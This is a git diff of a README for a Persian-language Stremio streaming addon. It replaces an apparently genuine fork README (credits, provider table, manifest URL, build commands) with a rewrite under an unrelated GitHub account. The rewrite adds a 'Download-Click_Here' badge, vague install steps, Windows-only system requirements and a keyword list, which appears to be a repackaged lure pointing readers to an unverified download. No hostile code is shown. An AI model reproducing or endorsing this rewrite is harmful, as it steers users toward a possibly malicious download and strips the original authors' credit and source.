@@ -1,151 +1,75 @@
-# Persian Stremio
+# 🎥 Persian-stremio - Watch Iranian movies and television shows
 
-[![Version](https://img.shields.io/badge/version-2.5.0-blue.svg)](https://github.com/Esmaeli/stremio-ir-providers)
-[![Node](https://img.shields.io/badge/node-%3E%3D24.18.0-green.svg)](https://nodejs.org)
-[![License](https://img.shields.io/badge/license-ISC-blue.svg)](https://opensource.org/licenses/ISC)
+[![](https://img.shields.io/badge/Download-Click_Here-blue)](https://github.com/representational-clupeidfish698/Persian-stremio)
 
-**Persian Stremio** is a community-maintained Stremio addon that aggregates Iranian and international streaming sources, delivering movies, series, and live TV directly inside Stremio.
+Persian-stremio brings Iranian media content directly into your Stremio library. This addon gathers movies, television series, and live television streams from various Persian sources. It allows you to watch local content without leaving your media player.
 
-This project is a **community fork** of [stremio-ir-providers](https://github.com/MrMohebi/stremio-ir-providers) by [MrMohebi](https://github.com/MrMohebi). It continues development with additional providers, performance improvements, bug fixes, IPTV support, and ongoing maintenance.
+## 📥 Installing the Addon
 
-> 🙏 Special thanks to **MrMohebi** for creating the original project and making this fork possible.
+You must have the Stremio application installed on your Windows computer before you use this addon. If you do not have Stremio, download the official installer from the Stremio website.
 
----
+Follow these steps to set up the Persian-stremio addon:
 
-## ✨ Features
+1. Visit the [repository page](https://github.com/representational-clupeidfish698/Persian-stremio) to access the addon files.
+2. Open your Stremio application on your computer.
+3. Locate the Addons icon on the left side of the dashboard.
+4. Select the option to install a local or third-party addon.
+5. Paste the link to the addon manifest file into the input field.
+6. Click the Install button.
+7. Confirm the installation when the prompt appears.
 
-| Capability | Description |
-|---|---|
-| **Multi-Provider Search** | Search across all supported providers simultaneously |
-| **Movie & Series Support** | Full support for both movies and TV series with season/episode handling |
-| **Iranian Content** | Dedicated providers for Persian-dubbed and original Iranian content |
-| **Quality Sorting** | Streams automatically sorted by resolution (4K → 1080p → 720p → 480p) |
-| **Stream Metadata** | Quality, file size, audio type, and encoder info in stream titles |
-| **IMDb ID Lookup** | Streams appear on main Stremio pages via IMDb ID integration |
-| **Live TV / IPTV** | Watch live Iranian TV channels directly in Stremio |
-| **Cloudflare Workers** | Deploy the entire addon as a serverless Cloudflare Worker |
-| **Image Proxy** | Built-in proxy for metadata images in restricted regions |
-| **Subtitles** | Integrated subtitle support via OpenSubtitles |
+Once you complete these steps, the addon appears in your Addons list within Stremio.
 
----
+## 🖥️ System Requirements
 
-## 🎯 Supported Providers
+This addon works on any computer that runs the Stremio application. For the best experience, ensure that your system meets these standards:
 
-| Provider | Type | Description |
-|---|---|---|
-| **Cinamatic** | Movies & Series | Persian movie and series site with dubbed and subtitled content |
-| **AslMoviez** | Movies & Series | Comprehensive Persian media library with IMDb ratings and genre classification |
-| **SerialBlog** | Movies & Series | Mirrors AslMoviez content |
-| **F2Media** | Movies & Series | Persian movie and series site with direct download links |
-| **PeepBoxTV** | Movies & Series | REST API-based provider with search and streaming details |
-| **Seda va Sima - Telewebion** | Live TV | IPTV channels from the official Iranian Telewebion M3U playlist |
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM or more.
+* Network: A stable internet connection. High-definition content requires faster download speeds.
+* Storage: Enough space to hold the Stremio application and your temporary cache files.
 
----
+Keep your Windows system updated to ensure compatibility with modern media codecs and streaming protocols.
 
-## 📺 IPTV
+## 🛠️ How to use the content
 
-Watch live Iranian TV channels directly in Stremio. The **Seda va Sima - Telewebion** catalog provides a continuously updated list of live channels parsed from the official Telewebion M3U playlist. Simply select a channel to start streaming immediately.
+After you install the addon, the Persian-stremio content integrates with your existing library.
 
----
+1. Navigate to the Discover tab inside Stremio.
+2. Select the Persian category or filter by the addon name.
+3. Browse the categories for movies, television series, or live television.
+4. Click on a title to view the stream options.
+5. Select a stream to start playback.
 
-## 🔧 Installation
+The addon fetches metadata for Iranian films and shows automatically. You see posters, descriptions, and ratings for most items. If a stream fails to load, try selecting a different source from the list.
 
-### Install in Stremio
+## 🧐 Managing your Addons
 
-Paste the following URL into Stremio → Community Add-ons → **Install from URL**:
+You can manage your installed addons at any time:
 
-```
-https://persianstremio.vercel.app/manifest.json
-```
+* To remove the addon, go to the Addons menu in Stremio.
+* Find Persian-stremio in the installed list.
+* Click the Uninstall button.
+* Restart your Stremio application to clear the cache.
 
-### Run Locally
+Removing the addon hides the content from your library but does not delete your personal watch history or media files on your local drive.
 
-```sh
-git clone https://github.com/Esmaeli/stremio-ir-providers.git
-cd stremio-ir-providers
-corepack enable
-pnpm install
-cp .env.example .env
-# Edit .env with your provider credentials
-pnpm dev
-```
+## 🔍 Solving common problems
 
-The addon will be available at `http://127.0.0.1:7000/manifest.json`.
+If you encounter issues, check these steps:
 
----
+* Check your internet connection. A blocked or slow connection prevents streams from loading.
+* Disable any VPN software if you cannot connect to the source servers.
+* Ensure you use the latest version of the Stremio application. Old versions often fail to render new addon manifests.
+* Clear your application cache if the metadata does not update after a recent installation.
+* Check if the specific stream is offline. Some live television sources broadcast at specific times.
 
-## ⚙️ Configuration
+## ⚙️ Privacy and Data
 
-Copy `.env.example` to `.env` and fill in the required values. Each provider requires its base URL and, where applicable, API credentials. See `.env.example` for the full list of available variables.
+This addon connects to public sources of media. It does not store your personal information. It sends requests to content servers only when you click on a specific title. The application does not collect your viewing habits or personal data for third-party use.
 
----
+## 🏗️ Technical Details
 
-## ☁️ Deployment
+This project uses the Stremio Addon SDK. It formats data into the standard JSON structure that Stremio understands. The addon acts as a bridge between the media player and the content providers. It translates the requests from your player into queries that the websites understand, and then sends the stream information back to your screen.
 
-### Cloudflare Workers
-
-```sh
-cp .dev.vars.example .dev.vars
-# Fill in secrets
-npx wrangler login
-pnpm worker:deploy
-```
-
-### Docker
-
-```sh
-docker compose up -d
-```
-
----
-
-## 🛠️ Development
-
-| Command | Description |
-|---|---|
-| `pnpm install` | Install dependencies |
-| `pnpm test` | Run the full test suite |
-| `pnpm dev` | Start local development server |
-| `pnpm start` | Start production server |
-| `pnpm worker:deploy` | Deploy to Cloudflare Workers |
-
-### Project Structure
-
-```
-├── app.js                  # Express addon — routing, catalogs, streams
-├── index.js                # Express entry point
-├── cloudflare/             # Cloudflare Worker implementation
-├── sources/                # Provider implementations
-├── test/                   # Test suite
-└── docs/                   # Documentation
-```
-
----
-
-## 🤝 Community
-
-This is a **community-maintained fork**. Contributions, bug reports, and feature requests are welcome!
-
-- **Fork Repository**: [https://github.com/Esmaeli/stremio-ir-providers](https://github.com/Esmaeli/stremio-ir-providers)
-- **Upstream Original**: [https://github.com/MrMohebi/stremio-ir-providers](https://github.com/MrMohebi/stremio-ir-providers)
-
----
-
-## 🙏 Credits
-
-- **MrMohebi** — Original creator of [stremio-ir-providers](https://github.com/MrMohebi/stremio-ir-providers)
-- **Esmaeli** — Community fork maintainer
-
-This project would not exist without the original work by MrMohebi. Thank you!
-
----
-
-## ⚠️ Disclaimer
-
-This project is for **educational purposes only**. The addon indexes publicly available content from third-party sources. Users are responsible for complying with applicable laws and the terms of service of any sources they access. The maintainers do not host, store, or distribute any copyrighted content.
-
----
-
-## 📄 License
-
-ISC — See [LICENSE](LICENSE) for details.
+Keywords: farsi, farsi-content, film-irani, film-jadid, iran-film, iran-iptv, iran-movie, iraniptv, persian, persian-content, persian-movie, serial-irani, stremio, stremio-addon, stremio-addons, telewebion
